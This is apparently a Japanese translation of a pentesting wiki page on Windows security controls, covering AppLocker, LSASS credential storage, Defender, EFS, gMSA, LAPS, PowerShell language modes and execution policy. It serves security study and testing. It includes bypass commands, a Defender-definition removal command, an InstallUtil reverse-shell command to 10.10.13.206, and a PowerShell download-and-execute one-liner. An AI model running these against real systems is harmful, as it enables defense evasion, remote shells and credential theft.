# Windows Security Controls

{{#include ../banners/hacktricks-training.md}}

## AppLocker Policy

アプリケーションのホワイトリストは、システム上に存在し、実行することが許可された承認済みのソフトウェアアプリケーションまたは実行ファイルの一覧です。その目的は、組織固有のビジネスニーズに合致しない有害なマルウェアや未承認ソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の**アプリケーションホワイトリストソリューション**であり、システム管理者が**ユーザーによる実行を許可するアプリケーションとファイルを制御**できるようにします。実行ファイル、スクリプト、Windows installer ファイル、DLL、パッケージ化されたアプリ、パッケージ化されたアプリのインストーラーに対して、**きめ細かな制御**を提供します。\
組織では、**cmd.exe と PowerShell.exe** および特定のディレクトリへの書き込みアクセスを**ブロックする**ことが一般的です。**しかし、これらはすべて bypass できます**。

### Check

ブラックリストまたはホワイトリストに登録されているファイルや拡張子を確認します。
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
このレジストリパスには、AppLocker によって適用される設定とポリシーが含まれており、システム上で現在強制されているルールを確認できます。

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy を bypass するために有用な **Writable folders**: AppLocker が `C:\Windows\System32` または `C:\Windows` 内の任意のものの実行を許可している場合、これを **bypass** するために使用できる **writable folders** があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に**信頼されている**[**「LOLBAS」](https://lolbas-project.github.io/) バイナリも、AppLocker の bypass に利用できます。
- **不適切に記述されたルールも bypass できる可能性があります**
- 例えば **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** の場合、どこにでも **`allowed` という名前のフォルダー**を作成でき、そのフォルダーは許可されます。
- 組織はしばしば **`%System32%\WindowsPowerShell\v1.0\powershell.exe` 実行ファイルのブロック**に注力しますが、`%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` など、その他の [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) を忘れがちです。
- **DLL enforcement** は、システムに追加の負荷がかかる可能性があり、何も壊れないことを確認するために必要なテスト量も多いため、ほとんど有効化されていません。そのため、**DLL を backdoor として使用すると AppLocker の bypass に役立ちます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意の process 内で **Powershell** code を実行し、AppLocker を bypass できます。詳しくは、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[1]](#references)</sup>

## 認証情報の保存

### Security Accounts Manager (SAM)

ローカルの認証情報はこのファイルに存在し、password は hash 化されています。

### Local Security Authority (LSA) - LSASS

Single Sign-On のため、この subsystem の **memory** 内に **credentials**（hash 化されたもの）が**保存**されます。\
**LSA** はローカルの **security policy**（password policy、users の permissions など）、**authentication**、**access tokens** などを管理します。\
LSA は、**SAM** file 内に提供された **credentials**（ローカル login の場合）を**確認**し、**domain controller** と**通信**して domain user を authenticate します。

**credentials** は **process LSASS** 内に**保存**されます：Kerberos tickets、NT hash および LM hash、容易に復号できる password などです。

### LSA secrets

LSA は一部の credentials を disk に保存することがあります：

- Active Directory の computer account の password（到達不能な domain controller）。
- Windows services の accounts の passwords
- scheduled tasks の passwords
- その他（IIS applications の password など）

### NTDS.dit

これは Active Directory の database です。Domain Controllers にのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) は、Windows 10、Windows 11、および Windows Server の各バージョンで利用できる Antivirus です。**`WinPEAS`** などの一般的な pentesting tools を**ブロック**します。ただし、これらの **protections を bypass する方法**があります。

### Check

**Defender** の**status**を確認するには、PS cmdlet **`Get-MpComputerStatus`** を実行します（有効かどうかを確認するには **`RealTimeProtectionEnabled`** の値を確認します）。

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

列挙するには、次のコマンドも実行できます：
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFSは、**File Encryption Key (FEK)** と呼ばれる**symmetric key**を使用してファイルを暗号化し、ファイルを保護します。このキーはユーザーの**public key**で暗号化され、暗号化されたファイルの $EFS **alternative data stream**内に保存されます。復号が必要な場合、ユーザーのデジタル証明書に対応する**private key**を使用して、$EFS streamからFEKを復号します。詳細については[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーの操作なしで復号されるシナリオ**には、以下が含まれます。

- ファイルまたはフォルダが[ FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table)のような、EFSに対応していないファイルシステムへ移動されると、自動的に復号されます。
- SMB/CIFS protocol経由でネットワーク上に送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式により、所有者は暗号化されたファイルへ**transparent access**できます。ただし、所有者のパスワードを単に変更してログインするだけでは、復号できません。

**Key Takeaways**:

- EFSはsymmetric FEKを使用し、ユーザーのpublic keyで暗号化します。
- 復号では、ユーザーのprivate keyを使用してFEKへアクセスします。
- FAT32へのコピーやネットワーク送信など、特定の条件下で自動的に復号されます。
- 暗号化されたファイルには、所有者が追加の操作なしでアクセスできます。

### EFS infoの確認

**user**がこの**service**を**使用した**かどうかは、次のpathが存在するか確認します:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file>\を使用して、ファイルに**アクセス**できる**ユーザー**を確認します\
フォルダ内で`cipher /e`および`cipher /d`を使用すると、すべてのファイルを**encrypt**および**decrypt**することもできます

### EFS filesの復号

#### Authority Systemになる

この方法では、ホスト内で**victim user**が**process**を**running**している必要があります。その場合、`meterpreter` sessionを使用して、ユーザーのprocessのtoken（`incognito`の`impersonate_token`）をimpersonateできます。または、ユーザーのprocessへ`migrate`することもできます。

#### ユーザーのpasswordを知っている場合

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoftは、IT infrastructureにおけるservice accountsの管理を簡素化するため、**Group Managed Service Accounts (gMSA)**を開発しました。従来のservice accountsでは "**Password never expire**" settingが有効になっていることが多いのに対し、gMSAはより安全で管理しやすいsolutionを提供します。

- **Automatic Password Management**: gMSAは、domainまたはcomputer policyに従って自動的に変更される、240文字の複雑なpasswordを使用します。このprocessはMicrosoftのKey Distribution Service (KDC)によって処理されるため、手動でpasswordを更新する必要がありません。
- **Enhanced Security**: これらのaccountsはlockoutの影響を受けず、interactive loginsに使用できないため、securityが向上します。
- **Multiple Host Support**: gMSAは複数のhosts間で共有できるため、複数のservers上で実行されるservicesに適しています。
- **Scheduled Task Capability**: managed service accountsとは異なり、gMSAはscheduled tasksの実行をサポートします。
- **Simplified SPN Management**: computerのsAMaccount detailsまたはDNS nameに変更があると、systemがService Principal Name (SPN)を自動的に更新するため、SPN managementが簡素化されます。

gMSAのpasswordはLDAP property _**msDS-ManagedPassword**_に保存され、Domain Controllers (DCs)によって30日ごとに自動的にresetされます。このpasswordは[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)として知られるencrypted data blobであり、authorized administratorsとgMSAがinstallされているserversのみが取得できます。これによりsecure environmentが確保されます。このinformationにアクセスするには、LDAPSなどのsecured connectionが必要です。または、connectionを'Sealing & Secure'でauthenticatedする必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)を使用して、このpasswordを読み取ることができます**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**この投稿で詳細を確認**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

また、**NTLM relay attack**を実行して**gMSA**の**password**を**read**する方法については、この[web page](https://cube0x0.github.io/Relaying-for-gMSA/)も確認してください。<sup>[[3]](#references)</sup>

## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899)からダウンロードできる**Local Administrator Password Solution (LAPS)**を使用すると、ローカルAdministratorのpasswordを管理できます。**randomized**され、uniqueで、**regularly changed**されるこれらのpasswordは、Active Directoryに一元的に保存されます。これらのpasswordへのアクセスは、ACLによってauthorized usersに制限されます。十分なpermissionsが付与されている場合、local admin passwordをreadできます。

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShellの[**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)は、PowerShellを効果的に使用するために必要な多くのfeaturesを**locks down**します。これには、COM objectsのblocking、approved .NET typesのみの許可、XAML-based workflows、PowerShell classesなどが含まれます。

### **確認**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
現在のWindowsではその Bypass は機能しませんが、[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM)を使用できます。\
**コンパイルするには** **to** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを.Net4.5に変更する**必要がある場合があります。

#### Direct bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセスで **Powershell** コードを **execute** し、constrained mode を bypass できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[1]](#references)</sup>

## PS 実行ポリシー

デフォルトでは **restricted** に設定されています。このポリシーを bypass する主な方法:<sup>[[4]](#references)</sup>
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細は[こちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>を参照してください。

## Security Support Provider Interface (SSPI)

ユーザーの認証に使用できるAPIです。

SSPIは、通信を行おうとする2台のマシンに適したプロトコルを見つける役割を担います。これにはKerberosが優先的に使用されます。その後、SSPIは使用する認証プロトコルをネゴシエートします。これらの認証プロトコルはSecurity Support Provider (SSP)と呼ばれ、各Windowsマシン内にDLLとして配置されています。通信するには、両方のマシンが同じプロトコルをサポートしている必要があります。

### Main SSPs

- **Kerberos**: 優先されるプロトコル
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** および **NTLMv2**: 互換性上の理由
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: WebサーバーおよびLDAPで使用され、パスワードはMD5 hashの形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSLおよびTLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコルをネゴシエートするために使用されます（KerberosまたはNTLM。デフォルトはKerberos）
- %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションでは、複数の方式または1つだけの方式が提示される場合があります。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)は、**権限昇格を伴うアクティビティに対する同意プロンプト**を有効にする機能です。

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## References

- [1] [ApplockerおよびPowershell contstrained language modeのBypass](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [2] [EFS filesをdecryptする方法](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSAのRelaying](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution PolicyをBypassする15の方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

{{#include ../banners/hacktricks-training.md}}
